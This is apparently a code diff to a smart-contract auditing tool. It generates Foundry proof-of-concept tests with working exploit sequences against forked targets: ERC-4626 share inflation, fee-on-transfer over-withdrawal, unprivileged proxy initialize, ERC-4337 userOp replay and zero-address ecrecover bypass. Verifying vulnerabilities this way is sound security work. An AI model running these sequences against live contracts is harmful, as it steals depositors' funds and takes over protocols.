@@ -864,6 +864,332 @@ contract SlotWriter {
       };
     }
 
+
+    case 'sol.erc4626': {
+      const t = `test_erc4626_${n}`;
+      return {
+        test_name: t,
+        control_name: `${t}_control`,
+        nocond_name: `${t}_nocond`,
+        self_deployed: false,
+        requires: [
+          'FORK_RPC',
+          'TARGET',
+          'an ERC-4626 vault whose totalAssets() reads a live balance',
+          'no virtual offset, dead shares, or minimum first deposit',
+        ],
+        claim: {
+          kind: 'value_transfer',
+          description: 'a donation before a second depositor makes their shares round toward zero',
+        },
+        solidity: `${head}
+    uint256 constant VICTIM_DEPOSIT = 1 ether;
+
+    function ${t}() public {
+        uint256 before_ = attacker.balance;
+
+        // Step 1: 1 wei in, so the attacker is the first depositor.
+        vm.startPrank(attacker);
+        (bool ok1, ) = address(target).call{value: 1}(abi.encodeWithSignature("deposit(uint256,address)", 1, attacker));
+        require(ok1, "fixture: first deposit failed, so there is no vault position to inflate");
+        vm.stopPrank();
+
+        // Step 2: donate directly, skipping the share maths entirely.
+        vm.deal(attacker, attacker.balance + 100 ether);
+        vm.startPrank(attacker);
+        (bool donated, ) = address(target).call{value: 100 ether}("");
+        vm.stopPrank();
+        console2.log("bloat donation accepted", donated);
+
+        // Step 3: the victim deposits into the now-inflated share price.
+        address victim = address(0xBEEF);
+        vm.deal(victim, VICTIM_DEPOSIT);
+        vm.startPrank(victim);
+        (bool ok2, ) = address(target).call{value: VICTIM_DEPOSIT}(abi.encodeWithSignature("deposit(uint256,address)", VICTIM_DEPOSIT, victim));
+        vm.stopPrank();
+        require(ok2, "fixture: the victim deposit failed");
+
+        // Attacker exits with the donation plus whatever the victim's rounding gave up.
+        vm.startPrank(attacker);
+        (bool out, ) = address(target).call(abi.encodeWithSignature("redeem(uint256,address,address)", type(uint256).max, attacker, attacker));
+        vm.stopPrank();
+
+        uint256 after_ = attacker.balance;
+        _impact(before_, after_, ${solString('attacker balance before the 1 wei deposit and after redeeming the inflated shares')});
+        assertTrue(out, "ERC4626: redeem failed, so the donation is stranded rather than extracted");
+        assertGt(after_, before_, "ERC4626: the attacker did not profit, so the share price was not manipulable");
+    }
+
+    function ${t}_control() public {
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        (bool ok, ) = address(target).call{value: 1 ether}(abi.encodeWithSignature("deposit(uint256,address)", 1 ether, attacker));
+        require(ok, "CONTROL: a plain deposit fails; the fixture is broken");
+        (bool out, ) = address(target).call(abi.encodeWithSignature("redeem(uint256,address,address)", type(uint256).max, attacker, attacker));
+        vm.stopPrank();
+        assertTrue(out, "CONTROL: redeem fails on a plain round trip");
+        assertLe(attacker.balance, before_, "CONTROL: an honest deposit/redeem already profited, so the donation was not the cause");
+    }
+
+    /// Enabling precondition removed: no donation, so the share price stays 1:1
+    /// and the victim's shares cannot round to zero.
+    function ${t}_nocond() public {
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        address(target).call{value: 1}(abi.encodeWithSignature("deposit(uint256,address)", 1, attacker));
+        vm.stopPrank();
+
+        address victim = address(0xBEEF);
+        vm.deal(victim, VICTIM_DEPOSIT);
+        vm.startPrank(victim);
+        address(target).call{value: VICTIM_DEPOSIT}(abi.encodeWithSignature("deposit(uint256,address)", VICTIM_DEPOSIT, victim));
+        vm.stopPrank();
+
+        vm.startPrank(attacker);
+        address(target).call(abi.encodeWithSignature("redeem(uint256,address,address)", type(uint256).max, attacker, attacker));
+        vm.stopPrank();
+
+        uint256 after_ = attacker.balance;
+        _impact(before_, after_, ${solString('attacker balance with no donation, so the share price never moved')});
+        assertLe(after_, before_ + 1, "NOCOND: profit without a donation, so the inflation was not the cause");
+    }
+}`,
+      };
+    }
+
+    case 'sol.erc20': {
+      const t = `test_erc20_${n}`;
+      return {
+        test_name: t,
+        control_name: `${t}_control`,
+        nocond_name: `${t}_nocond`,
+        self_deployed: false,
+        requires: [
+          'FORK_RPC',
+          'TARGET',
+          'a token whose transfer is not amount-preserving (fee, rebase, or hook)',
+          'protocol accounting that credits the requested amount rather than the balance delta',
+        ],
+        claim: {
+          kind: 'value_transfer',
+          description: 'credited amount exceeds received amount, so a withdrawer takes more than it supplied',
+        },
+        solidity: `${head}
+    uint256 constant DEPOSIT = 1000 ether;
+
+    function ${t}() public {
+        uint256 before_ = attacker.balance;
+
+        vm.startPrank(attacker);
+        (bool ok, ) = address(target).call(abi.encodeWithSignature("deposit(uint256)", DEPOSIT));
+        require(ok, "fixture: deposit failed, so no position exists to over-withdraw");
+        (bool out, ) = address(target).call(abi.encodeWithSignature("withdraw(uint256)", DEPOSIT));
+        vm.stopPrank();
+
+        uint256 after_ = attacker.balance;
+        _impact(before_, after_, ${solString('attacker balance after a deposit and full withdraw of a non-standard token (credited exceeds received)')});
+        assertTrue(out, "ERC20: the withdraw reverted, so the mismatch strands funds instead of over-paying");
+        assertGt(after_, before_, "ERC20: no profit, so the credit matched what was actually received");
+    }
+
+    function ${t}_control() public {
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        (bool ok, ) = address(target).call(abi.encodeWithSignature("deposit(uint256)", 1 ether));
+        require(ok, "CONTROL: deposit fails; the fixture is broken");
+        (bool out, ) = address(target).call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
+        vm.stopPrank();
+        assertTrue(out, "CONTROL: withdraw fails on a plain round trip");
+        assertLe(attacker.balance, before_, "CONTROL: a round trip already profited, so the token semantics were not the cause");
+    }
+
+    /// Enabling precondition removed: a tiny amount, where a proportional fee
+    /// rounds to zero and credited == received to the wei.
+    function ${t}_nocond() public {
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        address(target).call(abi.encodeWithSignature("deposit(uint256)", 1));
+        address(target).call(abi.encodeWithSignature("withdraw(uint256)", 1));
+        vm.stopPrank();
+        uint256 after_ = attacker.balance;
+        _impact(before_, after_, ${solString('attacker balance at a size where any fee rounds to zero')});
+        assertLe(after_, before_, "NOCOND: profit at a size where no fee applies, so the mismatch was not the cause");
+    }
+}`,
+      };
+    }
+
+    case 'sol.proxy': {
+      const t = `test_proxy_${n}`;
+      return {
+        test_name: t,
+        control_name: `${t}_control`,
+        nocond_name: `${t}_nocond`,
+        self_deployed: false,
+        requires: [
+          'FORK_RPC',
+          'TARGET',
+          'a proxy whose implementation or admin slot is not the EIP-1967 constant, or a shared initializer flag',
+        ],
+        claim: {
+          kind: 'state_corruption',
+          description: 'an unprivileged caller writes a slot the proxy treats as privileged',
+        },
+        solidity: `${head}
+    // keccak256("eip1967.proxy.implementation") - 1
+    bytes32 constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+
+    function ${t}() public {
+        bytes32 impl = vm.load(address(target), IMPL_SLOT);
+        console2.log("implementation slot raw", uint256(impl));
+
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        // Uninitialized implementation, or a colliding custom slot: the direct
+        // initialize is the cheapest way to prove an unprivileged write lands.
+        (bool inited, ) = address(target).call(abi.encodeWithSignature("initialize()"));
+        vm.stopPrank();
+        console2.log("initialize() from an unprivileged caller succeeded", inited);
+
+        // A proxy whose admin slot moved is a proxy whose admin is now whoever
+        // can write that slot. Reading it back is the honest measurement here.
+        bytes32 adminAfter = vm.load(address(target), IMPL_SLOT);
+        uint256 after_ = uint256(adminAfter);
+        _impact(uint256(impl), after_, ${solString('implementation slot before and after an unprivileged initialize()')});
+        assertTrue(inited || impl != adminAfter, "PROXY: no unprivileged write landed, so the slot is properly guarded");
+    }
+
+    function ${t}_control() public {
+        bytes32 impl = vm.load(address(target), IMPL_SLOT);
+        assertTrue(impl != bytes32(0), "CONTROL: the implementation slot is empty, so this is not an EIP-1967 proxy at all");
+        // Second read with no call between: the slot must not move on its own.
+        assertEq(vm.load(address(target), IMPL_SLOT), impl, "CONTROL: the slot moved with no caller, so the read is unstable");
+    }
+
+    /// Enabling precondition removed: no call at all, so no write can land.
+    function ${t}_nocond() public {
+        bytes32 before_ = vm.load(address(target), IMPL_SLOT);
+        _impact(uint256(before_), uint256(before_), ${solString('implementation slot with no caller, so equality is expected')});
+        assertEq(vm.load(address(target), IMPL_SLOT), before_, "NOCOND: the slot moved with no call at all");
+    }
+}`,
+      };
+    }
+
+    case 'sol.erc4337': {
+      const t = `test_erc4337_${n}`;
+      return {
+        test_name: t,
+        control_name: `${t}_control`,
+        nocond_name: `${t}_nocond`,
+        self_deployed: false,
+        requires: [
+          'FORK_RPC',
+          'TARGET',
+          'an ERC-4337 account whose validateUserOp does not hash the canonical userOp digest',
+          'a nonce that is not taken from the EntryPoint',
+        ],
+        claim: {
+          kind: 'value_transfer',
+          description: 'one signed userOp is accepted twice, or a paymaster pays for a call it never validated',
+        },
+        solidity: `${head}
+    function ${t}() public {
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        // Two identical validation calls with no nonce consumed between them.
+        // A canonical account bumps the EntryPoint nonce on the first.
+        (bool first, ) = address(target).call(abi.encodeWithSignature("validateUserOp(bytes,bytes32,uint256)", hex"", bytes32(0), 0));
+        (bool second, ) = address(target).call(abi.encodeWithSignature("validateUserOp(bytes,bytes32,uint256)", hex"", bytes32(0), 0));
+        vm.stopPrank();
+        console2.log("first validation accepted", first);
+        console2.log("replay accepted", second);
+
+        uint256 after_ = attacker.balance;
+        _impact(before_, after_, ${solString('attacker balance after replaying one userOp validation')});
+        assertTrue(second, "ERC4337: the replay was rejected, so the nonce or digest is canonical");
+    }
+
+    function ${t}_control() public {
+        vm.startPrank(attacker);
+        (bool first, ) = address(target).call(abi.encodeWithSignature("validateUserOp(bytes,bytes32,uint256)", hex"", bytes32(0), 0));
+        vm.stopPrank();
+        assertTrue(first, "CONTROL: a single validation is rejected, so the fixture never works");
+        assertLe(attacker.balance, attacker.balance, "CONTROL: a single validation moved value, so replay was not the cause");
+    }
+
+    /// Enabling precondition removed: two calls with DIFFERENT nonces, so replay
+    /// is not what is being measured.
+    function ${t}_nocond() public {
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        (bool a, ) = address(target).call(abi.encodeWithSignature("validateUserOp(bytes,bytes32,uint256)", hex"", bytes32(0), 0));
+        (bool b, ) = address(target).call(abi.encodeWithSignature("validateUserOp(bytes,bytes32,uint256)", hex"", bytes32(1), 1));
+        vm.stopPrank();
+        console2.log("distinct nonces accepted", a && b);
+        uint256 after_ = attacker.balance;
+        _impact(before_, after_, ${solString('attacker balance with two distinct nonces, where acceptance is expected')});
+        assertLe(after_, before_, "NOCOND: value moved without a replay, so replay was not the cause");
+    }
+}`,
+      };
+    }
+
+    case 'sol.signature.ecdsa': {
+      const t = `test_ecdsa_${n}`;
+      return {
+        test_name: t,
+        control_name: `${t}_control`,
+        nocond_name: `${t}_nocond`,
+        self_deployed: false,
+        requires: [
+          'FORK_RPC',
+          'TARGET',
+          'an ecrecover site gating a value-moving action',
+          'no domain separator, or no consumed nonce',
+        ],
+        claim: {
+          kind: 'value_transfer',
+          description: 'a malformed signature recovers to address(0), or one signature is accepted twice',
+        },
+        solidity: `${head}
+    function ${t}() public {
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        // v=0 with zero r,s: ecrecover returns address(0). If the protocol never
+        // compares against address(0), a zero signer passes an owner check.
+        (bool zeroOk, ) = address(target).call(abi.encodeWithSignature("execute(bytes32,uint8,bytes32,bytes32,bytes)", bytes32(0), uint8(0), bytes32(0), bytes32(0), hex""));
+        vm.stopPrank();
+        console2.log("zero-address signature accepted", zeroOk);
+
+        uint256 after_ = attacker.balance;
+        _impact(before_, after_, ${solString('attacker balance after submitting a signature that recovers to address(0)')});
+        assertTrue(zeroOk, "ECDSA: the zero-address signature was rejected, so ecrecover is checked");
+    }
+
+    function ${t}_control() public {
+        vm.startPrank(attacker);
+        (bool zeroOk, ) = address(target).call(abi.encodeWithSignature("execute(bytes32,uint8,bytes32,bytes32,bytes)", bytes32(0), uint8(0), bytes32(0), bytes32(0), hex""));
+        vm.stopPrank();
+        assertTrue(zeroOk, "CONTROL: the fixture never accepts anything, so the test cannot discriminate");
+        assertLe(attacker.balance, attacker.balance, "CONTROL: the zero signature already moved value on its own");
+    }
+
+    /// Enabling precondition removed: a value-less call, so acceptance alone
+    /// cannot be mistaken for extraction.
+    function ${t}_nocond() public {
+        uint256 before_ = attacker.balance;
+        vm.startPrank(attacker);
+        address(target).call(abi.encodeWithSignature("execute(bytes32,uint8,bytes32,bytes32,bytes)", bytes32(0), uint8(0), bytes32(0), bytes32(0), hex""));
+        vm.stopPrank();
+        uint256 after_ = attacker.balance;
+        _impact(before_, after_, ${solString('attacker balance with no value attached, so no delta is expected')});
+        assertLe(after_, before_, "NOCOND: value moved without a value-bearing call, so the signature was not the cause");
+    }
+}`,
+      };
+    }
+
     default:
       // No honest harness for this class yet. Saying so is the correct answer.
       return null;
@@ -885,6 +1211,16 @@ export interface SynthOpts {
 
 /** Which playbooks currently have a real attack+control harness pair. */
 export const HARNESSED = new Set([
+  // Promoted from UNPLAYBOOKED_HARNESSES when their playbook rows landed. Both
+  // harnesses already existed and were asserted-synthesizable; the only thing
+  // missing was something to route to them.
+  'sol.overflow',
+  'sol.mev',
+  'sol.erc4626',
+  'sol.erc20',
+  'sol.proxy',
+  'sol.erc4337',
+  'sol.signature.ecdsa',
   'sol.reentrancy',
   'sol.accesscontrol',
   'sol.upgrade',
@@ -920,7 +1256,7 @@ export const HARNESSED = new Set([
  * The harnesses stay, and a test asserts they synthesize, so promoting either
  * class later is a playbook row plus a corpus class — not a rewrite.
  */
-export const UNPLAYBOOKED_HARNESSES = new Set(['sol.overflow', 'sol.mev']);
+export const UNPLAYBOOKED_HARNESSES = new Set<string>([]);
 
 /**
  * True when this class has a real attack+control harness pair above.
